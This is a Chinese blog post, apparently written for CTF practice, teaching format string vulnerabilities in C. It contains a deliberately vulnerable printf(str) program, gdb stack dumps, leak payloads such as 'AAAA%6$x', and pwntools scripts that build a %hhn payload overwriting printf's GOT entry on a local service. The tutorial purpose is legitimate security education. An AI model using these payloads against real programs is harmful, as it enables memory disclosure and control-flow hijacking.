
<!DOCTYPE html>
<html lang="" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Processor&#39;s Blog - I'm just a little role.</title>

    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Fechin,"> 
    <meta name="description" content="每一个不曾起舞的日子都是对生命的辜负,转眼又是一年，想来又老了一岁，看到昨天空间刷的18岁，也确实值得缅怀一下？
那一年我高三。18岁嘛，少年当头，青春正好，然后我在高三。也就是那一年，跨过了人生中第二道门槛(?),高考。
听高中老师忽,"> 
    <meta name="author" content="Processor"> 
    <link rel="alternative" href="atom.xml" title="Processor&#39;s Blog" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    <link rel="stylesheet" href="/css/diaspora.css">

</head>

<body class="loading">
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="icon-home image-icon" href="javascript:;"></a>
    <div title="播放/暂停" class="icon-play"></div>
    <h3 class="subtitle">format string vulnerability</h3>
    <div class="social">
        <!--<div class="like-icon">-->
            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
        <!--</div>-->
        <div>
            <div class="share">
                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>
    <div class="section">
        <div class="article">
    <div>
        <h1 class="title">format string vulnerability</h1>
        <div class="stuff">
            <span>四月 08, 2017</span>
            
  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/2017/">2017</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Blogs/">Blogs</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PWN/">PWN</a></li></ul>


        </div>
        <div class="content markdown">
            <p>做题遇到了格式化字符串的漏洞，看了下大灰阔的Blog，发现他写的貌似有些抽象，自己又了解了一下，所以，我要记录下这有趣的事情。</p>
<a id="more"></a>
<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><h2 id="0x01-关于format-string-vulnerability"><a href="#0x01-关于format-string-vulnerability" class="headerlink" title="0x01 关于format_string_vulnerability"></a>0x01 关于format_string_vulnerability</h2><p>格式化字符串漏洞是一类允许攻击者在任意内存地址执行读或者写操作的软件缺陷，由像printf这样需要用户输入的代码引起的，具有Set-UID root权限的这类程序在运行的时候，printf语句将会变得非常危险。格式化串漏洞和普通的栈溢出有相似之处，但又有所不同，它们都是利用了程序员的疏忽大意来改变程序运行的正常流程。格式化字符串漏洞在Windows下很难以利用，但是在Linux下的pwn题目中出现的频率是很高的。</p>
<h2 id="0x02-什么是格式化字符串"><a href="#0x02-什么是格式化字符串" class="headerlink" title="0x02 什么是格式化字符串"></a>0x02 什么是格式化字符串</h2><p><code>print()</code>、<code>fprint()</code>等一系列的函数可以按照一定的格式将数据进行输出，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Who_am_i:%s&quot;,&quot;Processor&quot;)</span><br><span class="line">printf(&quot;Who_am_i:%100s&quot;,&quot;Processor&quot;)</span><br></pre></td></tr></table></figure></p>
<p>printf函数的第一个参数就是格式化字符串，他来告诉程序将数据以什么格式输出，对于printf()函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;format&quot;,输出)；</span><br><span class="line"></span><br><span class="line">其中：</span><br><span class="line"></span><br><span class="line">format ：%[标志][输出最小宽度][.精度][长度]类型</span><br></pre></td></tr></table></figure></p>
<p>关于格式化字符串的具体说明请参照：<a href="http://bbs.aardio.com/doc/reference/libraries/kernel/string/format.html" target="_blank" rel="noopener">格式化字符串</a></p>
<h2 id="0x03格式化字符串漏洞原理"><a href="#0x03格式化字符串漏洞原理" class="headerlink" title="0x03格式化字符串漏洞原理"></a>0x03格式化字符串漏洞原理</h2><h3 id="printf-函数参数个数不固定实现地址读取"><a href="#printf-函数参数个数不固定实现地址读取" class="headerlink" title="printf()函数参数个数不固定实现地址读取"></a>printf()函数参数个数不固定实现地址读取</h3><p>我们先简单写一个正常的程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a=1,b=2,c=3;</span><br><span class="line">    int buf = &quot;test&quot; ;</span><br><span class="line">    printf(&quot;%s %d %d %d\n&quot;,buf,a,b,c);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>编译之后运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ gcc -m32 -fno-stack-protector -o format format.c</span><br><span class="line">➜  ~ ./format</span><br><span class="line">test 1 2 3</span><br></pre></td></tr></table></figure></p>
<p>那么我们给printf()函数加一个参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%s %d %d %d %x\n&quot;,buf,a,b,c)</span><br></pre></td></tr></table></figure></p>
<p>接着编译运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ gcc -m32 -fno-stack-protector -o format1 format1.c </span><br><span class="line">format1.c: In function ‘main’:</span><br><span class="line">format1.c:6:12: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat=]</span><br><span class="line">     printf(&quot;%s %d %d %d %x\n&quot;,buf,a,b,c);</span><br><span class="line">            ^</span><br><span class="line">➜  ~ ./format</span><br><span class="line">test 1 2 3 f772e000</span><br></pre></td></tr></table></figure></p>
<p>我们这一次得到了<code>f772e000</code>这个数据。我们用gdb在printf()处下断点，进行调试，在<code>printf()</code>函数处下断点并且执行到这里，查看栈中数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> [----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffcfef (&quot;test&quot;)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xffffd020 --&gt; 0x1 </span><br><span class="line">EDX: 0xffffd044 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb8000 --&gt; 0x1b1db0 </span><br><span class="line">EDI: 0xf7fb8000 --&gt; 0x1b1db0 </span><br><span class="line">EBP: 0xffffd008 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffcfbc --&gt; 0x8048456 (&lt;main+75&gt;:	add    esp,0x20)</span><br><span class="line">EIP: 0xf7e4f670 (&lt;printf&gt;:	call   0xf7f25999)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e4f66b &lt;fprintf+27&gt;:	ret    </span><br><span class="line">   0xf7e4f66c:	xchg   ax,ax</span><br><span class="line">   0xf7e4f66e:	xchg   ax,ax</span><br><span class="line">=&gt; 0xf7e4f670 &lt;printf&gt;:	call   0xf7f25999</span><br><span class="line">   0xf7e4f675 &lt;printf+5&gt;:	add    eax,0x16898b</span><br><span class="line">   0xf7e4f67a &lt;printf+10&gt;:	sub    esp,0xc</span><br><span class="line">   0xf7e4f67d &lt;printf+13&gt;:	mov    eax,DWORD PTR [eax-0x68]</span><br><span class="line">   0xf7e4f683 &lt;printf+19&gt;:	lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffcfbc --&gt; 0x8048456 (&lt;main+75&gt;:	add    esp,0x20)</span><br><span class="line">0004| 0xffffcfc0 --&gt; 0x80484f0 (&quot;%s %d %d %d %x\n&quot;)</span><br><span class="line">0008| 0xffffcfc4 --&gt; 0xffffcfef (&quot;test&quot;)</span><br><span class="line">0012| 0xffffcfc8 --&gt; 0x1 </span><br><span class="line">0016| 0xffffcfcc --&gt; 0x2 </span><br><span class="line">0020| 0xffffcfd0 --&gt; 0x3 </span><br><span class="line">0024| 0xffffcfd4 --&gt; 0xf7fb8000 --&gt; 0x1b1db0 </span><br><span class="line">0028| 0xffffcfd8 --&gt; 0xf7fb6244 --&gt; 0xf7e1e020 (call   0xf7f25999)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e4f670 in printf () from /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">gdb-peda$ x/10x $sp</span><br><span class="line">0xffffcfbc:	0x08048456	0x080484f0	0xffffcfef	0x00000001</span><br><span class="line">0xffffcfcc:	0x00000002	0x00000003	0xf7fb8000	0xf7fb6244</span><br><span class="line">0xffffcfdc:	0xf7e1e0ec	0x00000001</span><br></pre></td></tr></table></figure></p>
<p>在栈结构里看出，这次的取值应该是<code>f7fb8000</code></p>
<p>我们接近对源代码进行修改：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%s %d %d %d %x %x %x %x\n&quot;,buf,a,b,c)</span><br></pre></td></tr></table></figure></p>
<p>编译并执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ gcc -m32 -fno-stack-protector -o format1 format1.c </span><br><span class="line">format1.c: In function ‘main’:</span><br><span class="line">format1.c:6:12: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat=]</span><br><span class="line">     printf(&quot;%s %d %d %d %x %x %x %x\n&quot;,buf,a,b,c);</span><br><span class="line">            ^</span><br><span class="line">format1.c:6:12: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat=]</span><br><span class="line">format1.c:6:12: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat=]</span><br><span class="line">format1.c:6:12: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat=]</span><br><span class="line">➜  ~ ./format1</span><br><span class="line">test 1 2 3 f76eb000 f76e9244 f75510ec 1</span><br></pre></td></tr></table></figure></p>
<p>我们可以和上面的调试结果进行对比，发现修改后的程序又进行了对栈中的数据进行输出操作。</p>
<p>我们可以用另一个程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char str[200];</span><br><span class="line">    fgets(str,200,stdin);</span><br><span class="line">    printf(str);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>编译并执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ gcc -m32 -fno-stack-protector -o a a.c</span><br><span class="line">a.c: In function ‘main’:</span><br><span class="line">a.c:6:12: warning: format not a string literal and no format arguments [-Wformat-security]</span><br><span class="line">     printf(str);</span><br><span class="line">            ^</span><br><span class="line">➜  ~ ./a</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">➜  ~ ./a</span><br><span class="line">AAAA%08x%08x%08x%08x</span><br><span class="line">AAAA000000c8f77615a0f77a6c0800000000</span><br><span class="line">➜  ~ ./a</span><br><span class="line">AAAA%08x%08x%08x%08x%08x%08x</span><br><span class="line">AAAA000000c8f77755a0f77bac08000000000000000041414141</span><br></pre></td></tr></table></figure></p>
<p>我们用gdb在printf()处下断点，进行调试，在<code>printf()</code>函数处下断点并且执行到这里，查看栈中数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> [----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffcf38 (&quot;AAAA%08x%08x%08x%08x\n&quot;)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x0 </span><br><span class="line">EDX: 0xf7fb987c --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb8000 --&gt; 0x1b1db0 </span><br><span class="line">EDI: 0xf7fb8000 --&gt; 0x1b1db0 </span><br><span class="line">EBP: 0xffffd008 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffcf1c --&gt; 0x80484ab (&lt;main+64&gt;:	add    esp,0x10)</span><br><span class="line">EIP: 0xf7e4f670 (&lt;printf&gt;:	call   0xf7f25999)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e4f66b &lt;fprintf+27&gt;:	ret    </span><br><span class="line">   0xf7e4f66c:	xchg   ax,ax</span><br><span class="line">   0xf7e4f66e:	xchg   ax,ax</span><br><span class="line">=&gt; 0xf7e4f670 &lt;printf&gt;:	call   0xf7f25999</span><br><span class="line">   0xf7e4f675 &lt;printf+5&gt;:	add    eax,0x16898b</span><br><span class="line">   0xf7e4f67a &lt;printf+10&gt;:	sub    esp,0xc</span><br><span class="line">   0xf7e4f67d &lt;printf+13&gt;:	mov    eax,DWORD PTR [eax-0x68]</span><br><span class="line">   0xf7e4f683 &lt;printf+19&gt;:	lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffcf1c --&gt; 0x80484ab (&lt;main+64&gt;:	add    esp,0x10)</span><br><span class="line">0004| 0xffffcf20 --&gt; 0xffffcf38 (&quot;AAAA%08x%08x%08x%08x\n&quot;)</span><br><span class="line">0008| 0xffffcf24 --&gt; 0xc8 </span><br><span class="line">0012| 0xffffcf28 --&gt; 0xf7fb85a0 --&gt; 0xfbad2288 </span><br><span class="line">0016| 0xffffcf2c --&gt; 0xf7ffdc08 --&gt; 0xf7fd8000 (jg     0xf7fd8047)</span><br><span class="line">0020| 0xffffcf30 --&gt; 0x0 </span><br><span class="line">0024| 0xffffcf34 --&gt; 0x0 </span><br><span class="line">0028| 0xffffcf38 (&quot;AAAA%08x%08x%08x%08x\n&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0xf7e4f670 in printf () from /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">gdb-peda$ x/20x $sp</span><br><span class="line">0xffffcf1c:	0x080484ab	0xffffcf38	0x000000c8	0xf7fb85a0</span><br><span class="line">0xffffcf2c:	0xf7ffdc08	0x00000000	0x00000000	0x41414141</span><br><span class="line">0xffffcf3c:	0x78383025	0x78383025	0x78383025	0x78383025</span><br><span class="line">0xffffcf4c:	0xffff000a	0xffffd010	0xf7fe2a4b	0x08048210</span><br><span class="line">0xffffcf5c:	0xffffcfc8	0xf7ffda74	0x00000001	0xf7fd5b48</span><br></pre></td></tr></table></figure></p>
<p>到这里，我们可以实现对地址的数据读取，如果想要获取<code>0x41414141</code>地址上的数据，我们可以构造如下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x41\x41\x41\x41%08x%08x%08x%08x%08x%s</span><br></pre></td></tr></table></figure></p>
<h3 id="对目标地址写入数据"><a href="#对目标地址写入数据" class="headerlink" title="对目标地址写入数据"></a>对目标地址写入数据</h3><p>格式符<code>%n</code>是输出前面已打印字符的长度，据此我们可以实现对目标地址的数据写入。</p>
<p>一个简单的程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a = 1234;</span><br><span class="line">    int b;</span><br><span class="line">    printf(&quot;%d%n\n&quot;,a,&amp;b);</span><br><span class="line">    printf(&quot;%d&quot;,b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>编译并执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ gcc -m32 -fno-stack-protector -o a a.c</span><br><span class="line">➜  ~ ./a</span><br><span class="line">1234</span><br><span class="line">4⏎</span><br></pre></td></tr></table></figure></p>
<p>这个程序的流程类似于：先输出a的值，然后把输出的字符长度赋给b，再输出b的值。这样，就可以在内存中写入b的值。</p>
<h2 id="0x04-Exploit"><a href="#0x04-Exploit" class="headerlink" title="0x04 Exploit"></a>0x04 Exploit</h2><p><code>%2$x</code>：该格式符输出了第二个参数位置的值</p>
<p>根据上面的程序，我们知道字符<code>AAAA</code>储存的位置是<code>sp+0x18</code>，所以：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ./a</span><br><span class="line">AAAA%6$x</span><br><span class="line">AAAA41414141</span><br></pre></td></tr></table></figure></p>
<p>其中<code>6</code>我们称为offset，pwntools有自动化代码可以算出offset:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># fmt_test.py</span><br><span class="line">#! /usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">	p = process(&quot;a.out&quot;)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	info = p.recv()</span><br><span class="line">	p.close()</span><br><span class="line">	return info</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">print autofmt.offset</span><br></pre></td></tr></table></figure></p>
<p>如果将<code>0xaaaaaaaa</code>写入<code>0x0804a010</code>，可以使用pwntools：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">printf_got = 0x804a010</span><br><span class="line">system_add = 0xaaaaaaaa</span><br><span class="line"></span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	return p.recv()</span><br><span class="line"></span><br><span class="line">p = remote(&quot;127.0.0.1&quot;, 10001)</span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">payload = fmtstr_payload(autofmt.offset, &#123;printf_got: system_add&#125;)</span><br></pre></td></tr></table></figure></p>
<p>生成的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; payload</span><br><span class="line">&apos;\x10\xa0\x04\x08\x11\xa0\x04\x08\x12\xa0\x04\x08\x13\xa0\x04\x08%154c%11$hhn%12$hhn%13$hhn%14$hhn&apos;</span><br></pre></td></tr></table></figure></p>
<p>将<code>0xaa</code>分别写入11,12,13,14位置，每次写入一字节。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>看着一片逻辑混乱的blog写出来的逻辑混乱的blog，日后自己有个更好的理解还会回来修改。</p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                <source type="audio/mpeg" src="http://link.hhtjim.com/163/425570952.mp3">
            </audio>
        </div>
    </div>
</div>

    </div>
</div>
</body>
<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/diaspora.js"></script>
<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



<!-- Google Analytics -->
<script type="text/javascript">
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-69833742-2', 'auto');
  ga('send', 'pageview');
</script>
<!-- End Google Analytics -->


</html>